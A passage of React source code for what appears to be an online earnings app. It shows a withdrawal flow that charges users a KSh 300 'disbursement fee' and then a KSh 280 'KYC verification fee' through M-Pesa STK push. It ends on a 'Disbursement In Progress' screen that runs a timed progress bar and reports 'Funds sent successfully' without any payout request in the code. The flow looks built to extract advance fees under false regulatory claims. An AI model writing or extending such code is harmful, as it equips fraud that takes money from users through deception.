  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const FEE_KES = 300;
  const normalize = raw => {
    let p = raw.replace(/\D/g, '');
    if (p.startsWith('0')) p = '254' + p.slice(1);
    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
    if (!p.startsWith('254')) p = '254' + p;
    return p;
  };
  const handlePay = async () => {
    setError('');
    if (!phone.trim()) { setError('Please enter your M-Pesa number'); return; }
    const norm = normalize(phone);
    if (!/^254[17]\d{8}$/.test(norm)) { setError('Please enter a valid M-Pesa number'); return; }
    setLoading(true);
    try {
      const resp = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `DIS_${Date.now()}`, description: 'Disbursement Fee' })
      });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || 'STK push failed');
      if (data?.transactionId) {
        const controller = new AbortController();
        setStkCancelFn(() => () => controller.abort());
        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
        setStkCancelFn(null);

        if (result === 'success') {
          setWithdrawalPhone(norm);
          setWithdrawalStage('kyc-required');
        } else if (result === 'cancelled') { /* leave for retry */ }
        else throw new Error('Payment not confirmed. Please try again.');
      } else throw new Error(data?.message || 'STK push failed');
    } catch (err) { setError(err.message || 'Network error. Try again.'); }
    finally { setLoading(false); }
  };
  return (
    <div className="fee-page-wrap"><div className="fee-card">
      <div className="fee-icon">💸</div>
      <h2 className="fee-title">Disbursement Fee</h2>
      <p className="fee-desc">Required to initiate your payout. Paid once per withdrawal request.</p>
      <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
      <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
      {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment... (20s)' : `Pay KSh ${FEE_KES}`}</button>
      <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
    </div></div>
  );
}

/* ═══════════════════ KYC REQUIRED (semi page) ═══════════════════ */
function KYCRequired() {
  const { setWithdrawalStage, setView } = useApp();

  const goToProfile = () => {
    setWithdrawalStage(null);
    setView('profile');
  };

  return (
    <div className="kyc-page-wrap">
      <div className="kyc-card">
        <div className="kyc-icon">
          <ShieldCheck size={34} />
        </div>
        <h2 className="kyc-title">KYC Verification Required</h2>
        <p className="kyc-desc">
          Your disbursement is on hold until identity verification is complete. This is a regulatory requirement for all payouts.
        </p>
        <div className="kyc-list">
          <div className="kyc-list-item"><BadgeCheck size={16} /> Verify your identity</div>
          <div className="kyc-list-item"><BadgeCheck size={16} /> Confirm your M-Pesa number</div>
          <div className="kyc-list-item"><BadgeCheck size={16} /> Complete verification payment</div>
        </div>
        <button className="gbtn fee-pay-btn" onClick={goToProfile}>
          Go to Profile to Verify →
        </button>
        <p className="fee-note">You'll be redirected to your profile to complete KYC.</p>
      </div>
    </div>
  );
}

/* ═══════════════════ KYC FEE (KSh 280) ═══════════════════ */
function KYCFee() {
  const { setWithdrawalStage, setWithdrawalPhone, setVerified, setStkCancelFn } = useApp();
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const FEE_KES = 280;
  const normalize = raw => {
    let p = raw.replace(/\D/g, '');
    if (p.startsWith('0')) p = '254' + p.slice(1);
    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
    if (!p.startsWith('254')) p = '254' + p;
    return p;
  };
  const handlePay = async () => {
    setError('');
    if (!phone.trim()) { setError('Please enter your M-Pesa number'); return; }
    const norm = normalize(phone);
    if (!/^254[17]\d{8}$/.test(norm)) { setError('Please enter a valid M-Pesa number'); return; }
    setLoading(true);
    try {
      const resp = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `KYC_${Date.now()}`, description: 'KYC Verification Fee' })
      });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || 'STK push failed');
      if (data?.transactionId) {
        const controller = new AbortController();
        setStkCancelFn(() => () => controller.abort());
        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
        setStkCancelFn(null);

        if (result === 'success') {
          setWithdrawalPhone(norm);
          setVerified(true);
          setWithdrawalStage('sending');
        } else if (result === 'cancelled') { /* leave for retry */ }
        else throw new Error('Payment not confirmed. Please try again.');
      } else throw new Error(data?.message || 'STK push failed');
    } catch (err) { setError(err.message || 'Network error. Try again.'); }
    finally { setLoading(false); }
  };
  return (
    <div className="fee-page-wrap"><div className="fee-card">
      <div className="fee-icon" style={{ background: '#fef3c7', color: '#d97706' }}>🔐</div>
      <h2 className="fee-title">KYC Verification Fee</h2>
      <p className="fee-desc">One-time KYC verification fee to release your funds and unlock higher limits.</p>
      <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
      <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
      {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment... (20s)' : `Pay KSh ${FEE_KES}`}</button>
      <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
    </div></div>
  );
}

/* ═══════════════════ DISBURSEMENT SENDING ═══════════════════ */
function DisbursementSending() {
  const { withdrawalPhone, endWithdrawal, balance } = useApp();
  const [progress, setProgress] = useState(0);
  useEffect(() => {
    const t = setInterval(() => setProgress(p => (p >= 100 ? 100 : p + 5)), 200);
    return () => clearInterval(t);
  }, []);
  return (
    <div className="fee-page-wrap"><div className="fee-card">
      <div className="fee-icon" style={{ background: '#f0fdf4', color: 'var(--green)' }}>✓</div>
      <h2 className="fee-title" style={{ color: 'var(--green)' }}>Disbursement In Progress</h2>
      <p className="fee-desc">Sending <b>${balance.toFixed(2)} USD</b> to <b>{withdrawalPhone?.replace(/^254/, '0')}</b>. Funds arrive within 3 minutes.</p>
      <div className="fee-progress"><div className="fee-progress-bar" style={{ width: `${progress}%` }} /></div>
      <p className="fee-note">{progress < 100 ? `Processing... ${progress}%` : 'Funds sent successfully ✅'}</p>
      <button onClick={endWithdrawal} className="gbtn fee-pay-btn" style={{ marginTop: 16 }}>Back to Earnings</button>
    </div></div>
  );
}

/* ═══════════════════ APP ═══════════════════ */
function AppShell() {
  const { view, withdrawalStage } = useApp();
  const [onboarded, setOnboarded] = useState(false);
  if (!onboarded) return <Onboarding onDone={() => setOnboarded(true)} />;
  if (withdrawalStage === 'disbursement') return <DisbursementFee />;
  if (withdrawalStage === 'kyc-required') return <KYCRequired />;
  if (withdrawalStage === 'kyc-fee') return <KYCFee />;
  if (withdrawalStage === 'sending') return <DisbursementSending />;
  return (
    <>
      <Header />
      <MobileDrawer />
      <div className={`view ${view === 'dashboard' ? 'active' : ''}`}><Dashboard /></div>
      <div className={`view ${view === 'earnings' ? 'active' : ''}`}><Earnings /></div>
      <div className={`view ${view === 'chat' ? 'active' : ''}`}><Chat /></div>
      <div className={`view ${view === 'profile' ? 'active' : ''}`}><Profile /></div>
      <ActivationModal />
      <StkOverlay />
      <EditProfileModal />
    </>
  );
}

ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <AppProvider>
      <AppShell />
    </AppProvider>
  </React.StrictMode>
);